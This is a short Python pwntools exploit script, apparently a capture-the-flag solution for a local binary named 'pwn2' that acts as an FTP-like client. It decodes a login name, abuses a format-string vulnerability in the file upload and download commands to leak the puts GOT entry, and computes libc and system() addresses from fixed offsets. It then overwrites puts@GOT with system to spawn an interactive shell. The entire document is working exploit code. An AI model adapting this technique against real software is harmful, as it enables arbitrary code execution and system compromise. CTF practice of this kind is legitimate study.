from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn2'
p = process(name)
elf = ELF(name)

if args.G:
    gdb.attach(p)


def get(name):
    p.sendline('get')
    p.recvuntil('enter the file name you want to get:')
    p.sendline(name)


def put(name, content):
    p.sendline('put')
    p.recvuntil('please enter the name of the file you want to upload:')
    p.sendline(name)
    p.recvuntil('then, enter the content:')
    p.sendline(content)


def show_dir():
    p.sendline('dir')


tmp = 'sysbdmin'
name = ""
for i in tmp:
    name += chr(ord(i) - 1)
success("name: " + name)  # rxraclhm

# password
def password():
    p.recvuntil('Name (ftp.hacker.server:Rainism):')
    p.sendline(name)


#password
password()

# puts_addr
puts_got = elf.got['puts']
success('puts_got : ' + hex(puts_got))
put(b'1111', p32(puts_got) + b'%7$s')
get('1111')
puts_addr = u32(p.recv()[4:8])

# system
libc_addr = puts_addr - 0x5f880
system_offset = 0x3ab40
system_addr = libc_addr + system_offset
success('puts_addr: ' + hex(puts_addr))
success('system_addr : ' + hex(system_addr))

# puts@got to system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})
put(b'/bin/sh;', payload)
get('/bin/sh;')

#get shell
show_dir()

p.interactive()